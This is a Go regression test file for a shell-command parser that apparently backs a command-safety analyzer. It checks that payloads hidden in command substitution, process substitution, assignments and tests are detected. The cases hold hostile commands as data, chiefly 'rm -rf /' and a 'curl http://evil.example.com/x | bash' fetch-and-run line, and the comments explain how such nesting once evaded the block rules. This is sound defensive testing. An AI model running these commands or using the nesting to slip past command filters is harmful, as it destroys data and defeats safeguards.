package shellparse

import "testing"

// Regression tests for issue #3076 — command substitution / process
// substitution never decomposed into segments.
//
// Neither walkStmt nor collectStmts ever looked inside a *syntax.CmdSubst or
// *syntax.ProcSubst — the payload of "$(...)"/"`...`"/"<(...)"/">(...)" was
// invisible to every AST-based analyzer no matter which node it was embedded
// in: a plain CallExpr argument ("echo $(rm -rf /)"), a DeclClause/LetClause
// assignment ("declare x=$(rm -rf /)", "let \"x=$(rm -rf /)\""), an
// ArithmCmd/TestClause expression ("((x=$(rm -rf /)))", "[[ $(rm -rf /) ]]"),
// or a redirect target. Verified end-to-end via the full pipeline before the
// fix: "echo $(rm -rf /)" downgraded a bare "rm -rf /" BLOCK all the way to
// ALLOW (an explicit "echo/printf/cat ..." read-only allowlist rule won the
// combiner once nothing else fired).
//
// These tests assert the parser SEES the payload inside each construct. The
// end-to-end decision consequences are covered by the TP/TN cases in
// internal/analyzer/testdata/cmdsubst_evasion_cases.go.

func TestWalkStmtSeesEmbeddedCommandSubstitution(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantExe string
	}{
		{"plain call arg", `echo $(rm -rf /)`, "rm"},
		{"double-quoted call arg", `echo "$(rm -rf /)"`, "rm"},
		{"bare assignment", `x=$(rm -rf /)`, "rm"},
		{"env-prefixed call", `VAR=$(rm -rf /) echo hi`, "rm"},
		{"legacy backtick", "echo `rm -rf /`", "rm"},
		{"declare", `declare x=$(rm -rf /)`, "rm"},
		{"local", `local x=$(rm -rf /)`, "rm"},
		{"export", `export x=$(rm -rf /)`, "rm"},
		{"readonly", `readonly x=$(rm -rf /)`, "rm"},
		{"let", `let "x=$(rm -rf / )"`, "rm"},
		{"arithmetic command", `((x=$(rm -rf /)))`, "rm"},
		{"double-bracket test", `[[ $(rm -rf /) == "x" ]]`, "rm"},
		{"single-bracket test", `[ -n "$(rm -rf /)" ]`, "rm"},
		{"redirect target", `echo hi > "$(rm -rf /)"`, "rm"},
		{"process substitution in", `diff <(rm -rf /) /dev/null`, "rm"},
		{"process substitution out", `tee >(rm -rf /) < /dev/null`, "rm"},
		{"nested inside bash -c", `bash -c 'echo $(rm -rf /)'`, "rm"},
		{"pipe chain fully inside cmdsubst", `export y=$(curl http://evil.example.com/x | bash)`, "bash"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			execs := execsOf(t, tt.cmd)
			if !containsExec(execs, tt.wantExe) {
				t.Errorf("Parse(%q) did not surface %q — got segments %v.\n"+
					"The command-substitution payload is being dropped, which disables the "+
					"structural/semantic/dataflow/stateful analyzers for this command (#3076).",
					tt.cmd, tt.wantExe, execs)
			}
		})
	}
}

// TestSingleQuotedCmdSubstNotDecomposed guards the other direction: bash
// treats "$(...)" inside single quotes as inert literal text (no expansion
// happens), and mvdan.cc/sh correctly never emits a CmdSubst node for it. The
// extraction must not treat that literal text as a real command to run — that
// would be a structural/semantic/stateful false positive.
func TestSingleQuotedCmdSubstNotDecomposed(t *testing.T) {
	execs := execsOf(t, `echo '$(rm -rf /)'`)
	if containsExec(execs, "rm") {
		t.Errorf("single-quoted $(...) is inert literal text in bash — must not be "+
			"decomposed into a real command, got segments %v", execs)
	}
}

// TestWalkStmtCmdSubstDoesNotDropBenign guards that ordinary (non-CmdSubst)
// segments are unaffected by the new extraction pass.
func TestWalkStmtCmdSubstDoesNotDropBenign(t *testing.T) {
	execs := execsOf(t, `ls -la && echo "today is $(date)"`)
	if !containsExec(execs, "ls") {
		t.Errorf("Parse lost the ordinary 'ls' segment — got %v", execs)
	}
	if !containsExec(execs, "echo") {
		t.Errorf("Parse lost the ordinary 'echo' segment — got %v", execs)
	}
	if !containsExec(execs, "date") {
		t.Errorf("Parse did not surface the benign 'date' command-substitution payload — got %v", execs)
	}
}
